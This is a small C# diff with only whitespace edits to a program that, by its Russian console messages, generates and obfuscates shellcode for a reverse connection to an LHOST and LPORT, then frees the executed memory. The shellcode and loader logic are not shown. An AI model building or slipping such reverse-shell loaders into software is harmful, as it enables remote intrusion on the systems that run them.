@@ -6,7 +6,7 @@ class Program
 {
     static void Main(string[] args)
     {
-        string ip = Settings.LHOST; 
+        string ip = Settings.LHOST;
         int port = Settings.LPORT;
 
         Console.WriteLine($"Генерация и обфускация шеллкода для обратного подключения к {ip}:{port}...");
@@ -34,7 +34,7 @@ class Program
 
         // Освобождаем память после выполнения
         MemoryManager.FreeMemory(allocatedMemory, (uint)obfuscatedShellcode.Length);
-        
+
         Console.WriteLine("Выполнение завершено.");
     }
 }
